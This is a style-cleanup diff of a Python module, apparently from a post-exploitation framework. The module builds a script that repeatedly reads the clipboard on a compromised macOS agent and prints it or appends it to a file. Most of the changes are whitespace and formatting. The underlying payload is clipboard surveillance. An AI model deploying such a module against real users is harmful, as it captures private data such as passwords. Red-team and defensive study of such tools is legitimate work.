@@ -1,5 +1,3 @@
-from lib.common import helpers
-
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -16,17 +14,17 @@ class Module:
             'Description': 'This module will write log output of clipboard to stdout (or disk).',
 
             # True if the module needs to run in the background
-            'Background' : False,
+            'Background': False,
 
             # File extension to save the file as
-            'OutputExtension' : "",
+            'OutputExtension': "",
 
             # if the module needs administrative privileges
-            'NeedsAdmin' : False,
+            'NeedsAdmin': False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe' : False,
-            
+            'OpsecSafe': False,
+
             # list of any references/other comments
             'Comments': ['']
         }
@@ -35,13 +33,13 @@ class Module:
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Agent' : {
+            'Agent': {
                 # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'Agent to grab clipboard from.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'OutFile' : {
+            'OutFile': {
                 # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'Optional file to save the clipboard output to.',
                 'Required'      :   False,
@@ -64,9 +62,8 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self):
-        
+
         outFile = self.options['OutFile']['Value']
 
         # the Python script itself, with the command to invoke
@@ -87,7 +84,7 @@ def func():
         pbstring = pb.stringForType_(NSStringPboardType)
 
         outFile = '%s'
-        
+
         if outFile != "":
             f = file(outFile, 'a+')
             f.write(pbstring)
@@ -101,6 +98,6 @@ def func():
         print e
     time.sleep(1)
 
-func()""" %(outFile)
+func()""" % (outFile)
 
         return script
